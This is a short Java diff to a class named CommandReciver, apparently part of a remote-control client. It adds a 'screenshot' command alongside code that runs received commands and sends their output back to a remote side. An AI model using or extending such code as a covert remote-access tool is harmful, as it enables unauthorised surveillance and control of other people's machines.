@@ -34,8 +34,12 @@ public class CommandReciver {
             String[] commands = left.replace("\\r", "").split("\\n");
             for (String command : commands) {
                 try {
-                    for (String out : execute(command)) {
-                        new Sender().send("commandout", out);
+                    if (command.equals("screenshot")) {
+                        Screenshot.takeScreenshot();
+                    } else {
+                        for (String out : execute(command)) {
+                            new Sender().send("commandout", out);
+                        }
                     }
                 } catch (NullPointerException e) {
                     e.printStackTrace();
